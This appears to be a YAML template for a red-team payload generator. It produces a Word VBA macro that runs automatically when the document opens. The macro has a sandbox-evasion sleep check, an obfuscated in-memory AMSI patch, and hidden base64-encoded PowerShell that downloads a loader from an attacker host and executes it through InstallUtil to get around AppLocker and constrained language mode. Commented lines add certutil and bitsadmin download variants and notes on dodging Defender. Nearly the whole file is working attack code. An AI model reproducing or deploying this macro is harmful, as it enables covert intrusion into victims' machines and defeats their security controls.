description: "VBA Macro for Powershell dropping a CLM bypass and spawning a reflective beacon (Applocker & Installutil Bypass) (AMSI Bypass)"
variables:
  outputdir: "output"
  vbaFile: "powershell-dropper-clm-reflection.vba"
  revshellFile: "loader.exe"
  port: 80
# Certutil and bitsadmin generate defender alerts
templates:
  vba:
    variables:
      #cmd_download: "certutil -urlcache -f http://{{LHOST}}:{{port}}/clmloader.txt C:\\windows\\tasks\\clmloader.txt"
      #cmd_download: "powershell -ep bypass -Nop -Sta -Window Hidden iwr -UseBasicParsing http://{{LHOST}}:{{port}}/clmloader.txt -OutFile C:\\windows\\tasks\\clmloader.txt"
      cmd_download: "iwr -UseBasicParsing http://{{LHOST}}:{{port}}/clmloader.exe -OutFile C:\\windows\\tasks\\clmloader.exe"
      #cmd_download: "Start-Process -FilePath C:\\Windows\\System32\\cmd.exe -ArgumentList '/c bitsadmin.exe /Transfer job http://{{LHOST}}:{{port}}/clmloader.txt C:\\Windows\\Tasks\\clmloader.txt'"
      #cmd_decode: "certutil -decode C:\\Windows\\Tasks\\clmloader.txt C:\\windows\\tasks\\clmloader.exe"
      cmd_execute: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /uri=http://{{LHOST}}:{{port}}/{{revshellFile}} /U C:\Windows\Tasks\clmloader.exe'
      wsh_fn: "{{ Helpers.random_str() }}"
    # If using bitsadmin, include the following, We download twice to skip the weird defender alert
    #{{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(cmd_download, Encoder.utf16le) }}",0
    #{{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(cmd_download, Encoder.utf16le) }}",0
    #{{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64('Start-Sleep -Seconds 5; '+cmd_decode, Encoder.utf16le) }}",0
    template: |-
      Dim {{wsh_fn}}
      Set {{wsh_fn}} = CreateObject("Wscript.Shell")
      {{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(cmd_download, Encoder.utf16le) }}",0
      {{wsh_fn}}.Run "powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64('Start-Sleep -Seconds 10; '+cmd_execute, Encoder.utf16le) }}",0
      Set {{wsh_fn}} = Nothing
  # https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/WordMacroRunner.vbs - AMSI Bypass via patch
  macro:
    template: |-
      Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
      Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
      Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
      Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
      Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
      Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
      Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
      Function MyMacro()
          Dim myTime
          Dim Timein As Date
          Dim second_time
          Dim Timeout As Date
          Dim subtime As Variant
          Dim vOut As Integer
          myTime = Time
          Timein = Date + myTime
          Sleep (4000)
          second_time = Time
          Timeout = Date + second_time
          subtime = DateDiff("s", Timein, Timeout)
          vOut = CInt(subtime)
          If subtime < 3.5 Then
              Exit Function
          End If
          Dim Is64 As Boolean
          Dim StrFile As String
          Dim check As Boolean
          Dim buf As Variant
          Dim addr As LongPtr
          Dim counter As LongPtr
          Dim data As String
          Dim res As LongPtr
          StrFile = Dir("c:\windows\system32\a?s?.d*")
          Is64 = arch()
          check = amcheck(StrFile, Is64)
          If check Then
              patch StrFile, Is64
          End If
          {{Templates.get('vba')}}
      End Function
      Function arch() As Boolean
          #If Win64 Then
              arch = True
          #Else
              arch = False
          #End If
      End Function
      Function amcheck(StrFile As String, Is64 As Boolean) As Boolean
          Dim szProcessName As String
          Dim hMod(0 To 1023) As LongPtr
          Dim numMods As Integer
          Dim res As LongPtr
          amcheck = False
          res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
          If Is64 Then
              numMods = cbNeeded / 8
          Else
              numMods = cbNeeded / 4
          End If
          For i = 0 To numMods
              szProcessName = String$(50, 0)
              GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
              If Left(szProcessName, 8) = StrFile Then
                  amcheck = True
              End If
              Next i
      End Function
      Sub patch(StrFile As String, Is64 As Boolean)
          Dim lib As LongPtr
          Dim Func_addr As LongPtr
          Dim temp As LongPtr
          Dim old As LongPtr
          Dim off As Integer
          lib = getmod(StrFile)
          If Is64 Then
              off = 96
          Else
              off = 80
          End If
          Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
          temp = VirtPro(ByVal Func_addr, 32, 64, 0)
          patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
          patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
          temp = VirtPro(ByVal Func_addr, 32, old, 0)
          If Is64 Then
              off = 352
          Else
              off = 256
          End If
      End Sub
      Sub test()
          MyMacro
      End Sub
      Sub Document_Open()
          test
      End Sub
      Sub AutoOpen()
          test
      End Sub
print:
- "Generating a vba payload for spawning a beacon utilising an AMSI bypass which drops a CLM bypass then loads via reflection"
- "VBA File: {{outputdir}}/{{vbaFile}}"
setupCommands:
- "mkdir -p {{outputdir}}"
- "rm -rf {{outputdir}}/{{vbaFile}}"
- "rm -rf {{outputdir}}/clmloader.txt"
- "base64 -w0 <{{outputdir}}/clmloader.exe >{{outputdir}}/clmloader.txt"
commands:
- |-
  cat << EOF >{{outputdir}}/{{vbaFile}}
  {{Templates.get('macro')}}
  EOF